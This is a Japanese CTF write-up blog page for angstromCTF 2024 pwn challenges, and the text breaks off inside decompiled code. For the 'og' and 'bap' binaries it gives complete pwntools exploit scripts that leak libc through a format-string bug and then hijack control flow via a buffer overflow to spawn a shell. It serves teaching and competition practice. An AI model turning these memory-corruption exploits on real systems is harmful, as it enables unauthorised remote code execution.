@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>Angstorm 2024 | House-of-Rona</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://blog.rqda.wtf/style.css">
+    <link rel="stylesheet" href="https://blog.rqda.wtf/color/green-auto.css">
+
+        <link rel="stylesheet" href="https://blog.rqda.wtf/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://blog.rqda.wtf/font-hack-subset.css">
+
+        <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
+    
+<link rel="stylesheet" href="https://blog.rqda.wtf/footnote.css">
+<link rel="stylesheet" href="https://blog.rqda.wtf/page.css">
+<link rel="stylesheet" href="https://www.nerdfonts.com/assets/css/webfont.css">
+
+<meta name="google-site-verification" content="I4O4hRvGX4CkU3wvuZTczjjZFLuG3YINxBvx2be_tHY">
+<link rel="stylesheet" href="https://blog.rqda.wtf/icon.css">
+
+<meta property="og:title" content="Angstorm 2024 | House-of-Rona">
+<meta property="og:image" content="https://github.com/rqdaA.png">
+<meta name="twitter:site" content="@907903">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Angstorm 2024 | House-of-Rona">
+<meta name="twitter:image" content="https://github.com/rqdaA.png">
+<meta property="author" content="Rona (rqdaA)">
+<meta property="description" content="heap問はいいぞ">
+<meta property="og:description" content="heap問はいいぞ">
+
+
+</head>
+
+<body class="">
+<div class="container">
+    
+<header class="header">
+    <div class="header__inner">
+        <div class="header__logo">
+            
+            <img src="https://github.com/rqdaA.png" alt="">
+            
+            
+            <a href="https://blog.rqda.wtf" style="text-decoration: none;">
+                <div class="logo">
+                    
+                    House-of-Rona
+                    
+                </div>
+            </a>
+        </div>
+    </div>
+
+    
+    <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://blog.rqda.wtf/tags"><i class='nf nf-oct-tag'></i>tags</a></li>
+            
+                <li><a href="https://blog.rqda.wtf/about"><i class='nf nf-dev-github_alt'></i>whoami</a></li>
+            
+                <li><a href="https://github.com/rqdaA" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-github_inverted'></i>github</a></li>
+            
+                <li><a href="https://twitter.com/907903" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-twitter'></i>twitter</a></li>
+            </ul>
+        </nav>
+    
+    
+    
+</header>
+
+
+    <div class="content">
+        
+<div class="post">
+    
+    <h1 class="post-title"><a href="https://blog.rqda.wtf/angstrom-2024/">Angstorm 2024</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2024-05-30
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/heap/">#heap</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/pwn/">#pwn</a></span>
+    
+
+    
+    <h1>Table of Content</h1>
+    <ul>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/angstrom-2024/#pwn-exam">[pwn] Exam</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#gai-yao">概要</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#exploit">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/angstrom-2024/#pwn-presidential">[pwn] presidential</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#gai-yao-1">概要</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#exploit-1">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/angstrom-2024/#pwn-og">[pwn] og</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#jie-xi">解析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#cui-ruo-xing">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#gong-ji">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#exploit-2">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/angstrom-2024/#pwn-bap">[pwn] bap</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#jie-xi-1">解析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#cui-ruo-xing-1">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#gong-ji-1">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#exploit-3">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/angstrom-2024/#pwn-leftright">[pwn] leftright</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#jie-xi-2">解析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#cui-ruo-xing-2">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#gong-ji-2">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#exploit-4">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/angstrom-2024/#pwn-heapify">[pwn] heapify</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#jie-xi-3">解析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#cui-ruo-xing-3">脆弱性</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#gong-ji-3">攻撃</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#exploit-5">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/angstrom-2024/#pwn-themectl">[pwn] themectl</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#jie-xi-4">解析</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/angstrom-2024/#exploit-6">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+    </ul>
+    <hr>
+    
+
+    
+        <div class="post-content">
+            <p><a href="https://ctftime.org/event/2375">Angstorm</a>にTPCとして出場しました。
+コンテスト中にpwn7問を解き、コンテスト後にとstacksort追加で解きました。</p>
+<h1 id="pwn-exam">[pwn] Exam</h1>
+<h2 id="gai-yao">概要</h2>
+<ul>
+<li><code>trust_level</code>が<code>0x7ffffffe</code>超えるとflagがもらえます。</li>
+<li><code>trust_level</code>は<code>-detrust</code>で初期化され、ループの中で1づつ増加させることができます。</li>
+<li><code>detrust</code>は入力で与えることができます。</li>
+<li><code>detrust</code>は正の範囲で入力できる。</li>
+</ul>
+<h2 id="exploit">exploit</h2>
+<p><code>detrust</code>を<code>0x7fffffff</code>にすることで<code>trust_level</code>を<code>0x80000001</code>にすることができます。
+あとはこれに2を足す処理を行うと<code>trust_level</code>が<code>0x7fffffff</code>になりflagが得られます。</p>
+<h1 id="pwn-presidential">[pwn] presidential</h1>
+<h2 id="gai-yao-1">概要</h2>
+<p>任意のshellcodeを実行してくれます。</p>
+<h2 id="exploit-1">exploit</h2>
+<p>https://www.exploit-db.com/exploits/42179
+を送るとシェルが降ってきます。</p>
+<h1 id="pwn-og">[pwn] og</h1>
+<h2 id="jie-xi">解析</h2>
+<p>checksecをします。</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[*] &#39;/home/user/ctf/og/og&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      No PIE (0x400000)
+</span></code></pre>
+<h2 id="cui-ruo-xing">脆弱性</h2>
+<p>自明なFSBとBoFがあります。</p>
+<h2 id="gong-ji">攻撃</h2>
+<p>FSBを使ってlibc leakをし、BoFでmainにリターンします。その後、one_gadgetを利用してシェルを取ります。</p>
+<h2 id="exploit-2">exploit</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i: i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>([elf_name], script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">name: </span><span>&#39;,
+</span><span>        </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%15$16p!</span><span>&#39; + </span><span style="color:#bf616a;">fmtstr_payload</span><span>(</span><span style="color:#d08770;">7</span><span>, {</span><span style="color:#d08770;">0x404018</span><span>: </span><span style="color:#d08770;">0x40126d</span><span>}, </span><span style="color:#bf616a;">numbwritten</span><span>=</span><span style="color:#d08770;">17</span><span>, </span><span style="color:#bf616a;">write_size</span><span>=&#39;</span><span style="color:#a3be8c;">short</span><span>&#39;) + </span><span style="color:#bf616a;">p64</span><span>(
+</span><span>            elf.sym[&#39;</span><span style="color:#a3be8c;">main</span><span>&#39;] + </span><span style="color:#d08770;">5</span><span>))
+</span><span>    buf = t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">!</span><span>&#39;)[:-</span><span style="color:#d08770;">1</span><span>]
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{buf</span><span style="color:#b48ead;">=</span><span>}&#39;)
+</span><span>    libc_base = </span><span style="color:#bf616a;">int</span><span>(buf[buf.</span><span style="color:#bf616a;">rindex</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">0x</span><span>&#39;):], </span><span style="color:#d08770;">16</span><span>) - </span><span style="color:#d08770;">0x29d90
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{libc_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&#39;)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">name:</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x00</span><span>&#39; * </span><span style="color:#d08770;">0x30 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x404700</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(libc_base + </span><span style="color:#d08770;">0xebc81</span><span>))
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">0
+</span><span>debug = </span><span style="color:#d08770;">0
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./og</span><span>&quot;
+</span><span>libc_name = &quot;&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">challs.actf.co 31312</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span style="color:#b48ead;">if </span><span>libc_name:
+</span><span>    libc: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(libc_name)
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span>&quot;&quot;&quot;
+</span><span>t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span style="color:#bf616a;">solve</span><span>()
+</span></code></pre>
+<h1 id="pwn-bap">[pwn] bap</h1>
+<h2 id="jie-xi-1">解析</h2>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[*] &#39;/home/user/ctf/bap/bap&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      No PIE (0x400000)
+</span></code></pre>
+<h2 id="cui-ruo-xing-1">脆弱性</h2>
+<p>ogと同様にFSBとBoFがあります。</p>
+<h2 id="gong-ji-1">攻撃</h2>
+<p>FSBを使ってlibc leakをし、BoFでmainにリターンします。その後ROPをします。</p>
+<h2 id="exploit-3">exploit</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i: i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>([elf_name], script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>([elf_name], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">:</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">%29$08pFIN</span><span>&#39;.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">0x10</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\x00</span><span>&#39;) + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x404700</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(elf.sym[&#39;</span><span style="color:#a3be8c;">main</span><span>&#39;] + </span><span style="color:#d08770;">88</span><span>) + </span><span style="color:#bf616a;">p64</span><span>(elf.sym[&#39;</span><span style="color:#a3be8c;">main</span><span>&#39;]))
+</span><span>    libc_base = </span><span style="color:#bf616a;">int</span><span>(t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">FIN</span><span>&#39;)[:-</span><span style="color:#d08770;">3</span><span>], </span><span style="color:#d08770;">16</span><span>) - </span><span style="color:#d08770;">0x29e40
+</span><span>    libc.address = libc_base
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;{libc_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&#39;)
+</span><span>    rop = </span><span style="color:#bf616a;">ROP</span><span>(libc)
+</span><span>    rop.</span><span style="color:#bf616a;">execv</span><span>(</span><span style="color:#96b5b4;">next</span><span>(libc.</span><span style="color:#bf616a;">search</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">/bin/sh</span><span>&#39;)), </span><span style="color:#d08770;">0</span><span>)
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">:</span><span>&#39;, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39; * </span><span style="color:#d08770;">0x18 </span><span>+ rop.</span><span style="color:#bf616a;">chain</span><span>())
+</span><span>
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">0
+</span><span>debug = </span><span style="color:#d08770;">0
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./chall.p</span><span>&quot;
+</span><span>libc_name = &quot;</span><span style="color:#a3be8c;">./libc.so.6</span><span>&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">challs.actf.co 31323</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span style="color:#b48ead;">if </span><span>libc_name:
+</span><span>    libc: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(libc_name)
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span>&quot;&quot;&quot;
+</span><span>t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span style="color:#bf616a;">solve</span><span>()
+</span></code></pre>
+<h1 id="pwn-leftright">[pwn] leftright</h1>
+<h2 id="jie-xi-2">解析</h2>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[*] &#39;/home/user/ctf/left_right/leftright&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span></code></pre>
+<p>疑似コード</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">int</span><span> __fastcall </span><span style="color:#8fa1b3;">main</span><span>(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span>, </span><span style="color:#b48ead;">const char </span><span>**</span><span style="color:#bf616a;">argv</span><span>, </span><span style="color:#b48ead;">const char </span><span>**</span><span style="color:#bf616a;">envp</span><span>)
+</span><span>{
+</span><span>  </span><span style="color:#b48ead;">const char </span><span>*v3; </span><span style="color:#65737e;">// rdx
+</span><span>  __int16 *v4; </span><span style="color:#65737e;">// rax
+</span><span>  __int16 v7; </span><span style="color:#65737e;">// [rsp+2h] [rbp-2Eh]
+</span><span>  </span><span style="color:#b48ead;">int</span><span> select; </span><span style="color:#65737e;">// [rsp+4h] [rbp-2Ch] BYREF
+</span><span>  </span><span style="color:#b48ead;">int</span><span> end; </span><span style="color:#65737e;">// [rsp+8h] [rbp-28h]
+</span><span>  </span><span style="color:#b48ead;">int</span><span> i; </span><span style="color:#65737e;">// [rsp+Ch] [rbp-24h]
+</span><span>  </span><span style="color:#b48ead;">char</span><span> s[</span><span style="color:#d08770;">24</span><span>]; </span><span style="color:#65737e;">// [rsp+10h] [rbp-20h] BYREF
+</span><span>  </span><span style="color:#b48ead;">unsigned </span><span>__int64 v12; </span><span style="color:#65737e;">// [rsp+28h] [rbp-8h]
+</span><span>
+</span><span>  v12 = </span><span style="color:#bf616a;">__readfsqword</span><span>(</span><span style="color:#d08770;">0x28</span><span style="color:#b48ead;">u</span><span>);
+</span><span>  </span><span style="color:#96b5b4;">setbuf</span><span>(stdout, </span><span style="color:#d08770;">0</span><span style="color:#b48ead;">LL</span><span>);
+</span><span>  </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Name: </span><span>&quot;);
+</span><span>  </span><span style="color:#96b5b4;">fgets</span><span>(s, </span><span style="color:#d08770;">15</span><span>, stdin);
+</span><span>  v7 = </span><span style="color:#d08770;">0</span><span>;
+</span><span>  arr[</span><span style="color:#d08770;">0</span><span>] = </span><span style="color:#d08770;">1</span><span>;
+</span><span>  end = </span><span style="color:#d08770;">0</span><span>;
+</span><span>  </span><span style="color:#b48ead;">while </span><span>( !end )
+</span><span>  {
+</span><span>    select = </span><span style="color:#d08770;">0</span><span>;
+</span><span>    </span><span style="color:#bf616a;">__isoc99_scanf</span><span>(&quot;</span><span style="color:#d08770;">%d</span><span>&quot;, &amp;select);
+</span><span>    </span><span style="color:#96b5b4;">getchar</span><span>();
+</span><span>    </span><span style="color:#b48ead;">if </span><span>( select == </span><span style="color:#d08770;">3 </span><span>)
+</span><span>    {
+</span><span>      end = </span><span style="color:#d08770;">1</span><span>;
+</span><span>    }
+</span><span>    </span><span style="color:#b48ead;">else if </span><span>( select &lt;= </span><span style="color:#d08770;">3 </span><span>)
+</span><span>    {
+</span><span>      </span><span style="color:#b48ead;">if </span><span>( select == </span><span style="color:#d08770;">2 </span><span>)
+</span><span>      {
+</span><span>        arr[v7] = </span><span style="color:#96b5b4;">getchar</span><span>();
+</span><span>      }
+</span><span>      </span><span style="color:#b48ead;">else
+</span><span>      {
+</span><span>        </span><span style="color:#b48ead;">if </span><span>( select )
+</span><span>        {
+</span><span>          </span><span style="color:#b48ead;">if </span><span>( select != </span><span style="color:#d08770;">1 </span><span>)
+</span><span>            </span><span style="color:#b48ead;">goto</span><span> LABEL_14;
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">else
+</span><span>        {
+</span><span>          </span><span style="color:#b48ead;">if </span><span>( !v7 )
+</span><span>          {
+</span><span>            </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">hey!</span><span>&quot;);
+</span><span>            </span><span style="color:#96b5b4;">exit</span><span>(</span><span style="color:#d08770;">1</span><span>);
+</span><span>          }
+</span><span>          --v7;
+</span><span>        }
+</span><span>        ++v7;
+</span><span>      }
+</span><span>    }
+</span><span>LABEL_14:
+</span><span>    </span><span style="color:#b48ead;">for </span><span>( i = </span><span style="color:#d08770;">0</span><span>; i &lt;= </span><span style="color:#d08770;">19</span><span>; ++i )
+</span><span>    {
+</span><span>      </span><span style="color:#b48ead;">if </span><span>( i )
+</span><span>        v3 = (</span><span style="color:#b48ead;">const char </span><span>*)asc_2014;
+</span><span>      </span><span style="color:#b48ead;">else
+</span><span>        v3 = (</span><span style="color:#b48ead;">const char </span><span>*)&amp;unk_2013;
+</span><span>      </span><span style="color:#b48ead;">if </span><span>( arr[i] )
